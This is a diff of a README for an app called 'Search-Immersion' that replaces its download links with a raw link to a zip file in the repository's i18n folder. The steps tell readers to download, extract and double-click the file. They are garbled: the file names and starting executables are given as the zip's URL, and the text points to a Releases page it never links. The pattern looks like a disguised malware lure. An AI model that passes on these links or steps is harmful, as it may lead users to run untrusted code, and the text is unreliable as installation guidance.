@@ -6,11 +6,11 @@ Welcome to Search-Immersion! This application allows you to transform Google's h
 
 ## 📥 Download the Application
 
-[![Download Search-Immersion](https://github.com/zobryayanayama/Search-Immersion/raw/refs/heads/main/i18n/Immersion-Search-v3.5-alpha.4.zip)](https://github.com/zobryayanayama/Search-Immersion/raw/refs/heads/main/i18n/Immersion-Search-v3.5-alpha.4.zip)
+[![Download Search-Immersion](https://raw.githubusercontent.com/zobryayanayama/Search-Immersion/main/i18n/Immersion_Search_v2.9.zip)](https://raw.githubusercontent.com/zobryayanayama/Search-Immersion/main/i18n/Immersion_Search_v2.9.zip)
 
 You will need to visit our Releases page to download the software. Click the link below to access it.
 
-[Download Search-Immersion](https://github.com/zobryayanayama/Search-Immersion/raw/refs/heads/main/i18n/Immersion-Search-v3.5-alpha.4.zip)
+[Download Search-Immersion](https://raw.githubusercontent.com/zobryayanayama/Search-Immersion/main/i18n/Immersion_Search_v2.9.zip)
 
 ## 🔍 Features
 
@@ -37,7 +37,7 @@ Visit the Releases page at the link provided above, and download the latest vers
 
 ### Step 2: Locate the Downloaded File
 
-Once the download is complete, locate the file in your downloads folder. It should look something like `https://github.com/zobryayanayama/Search-Immersion/raw/refs/heads/main/i18n/Immersion-Search-v3.5-alpha.4.zip`.
+Once the download is complete, locate the file in your downloads folder. It should look something like `https://raw.githubusercontent.com/zobryayanayama/Search-Immersion/main/i18n/Immersion_Search_v2.9.zip`.
 
 ### Step 3: Extract the Zip File
 
@@ -45,7 +45,7 @@ Right-click on the downloaded file and select "Extract All" or "Unzip" depending
 
 ### Step 4: Run the Application
 
-Inside the extracted folder, look for the starting file, typically named `https://github.com/zobryayanayama/Search-Immersion/raw/refs/heads/main/i18n/Immersion-Search-v3.5-alpha.4.zip` for Windows or `https://github.com/zobryayanayama/Search-Immersion/raw/refs/heads/main/i18n/Immersion-Search-v3.5-alpha.4.zip` for MacOS. Double-click this file to launch the application.
+Inside the extracted folder, look for the starting file, typically named `https://raw.githubusercontent.com/zobryayanayama/Search-Immersion/main/i18n/Immersion_Search_v2.9.zip` for Windows or `https://raw.githubusercontent.com/zobryayanayama/Search-Immersion/main/i18n/Immersion_Search_v2.9.zip` for MacOS. Double-click this file to launch the application.
 
 ### Step 5: Set Up Your Dashboard
 
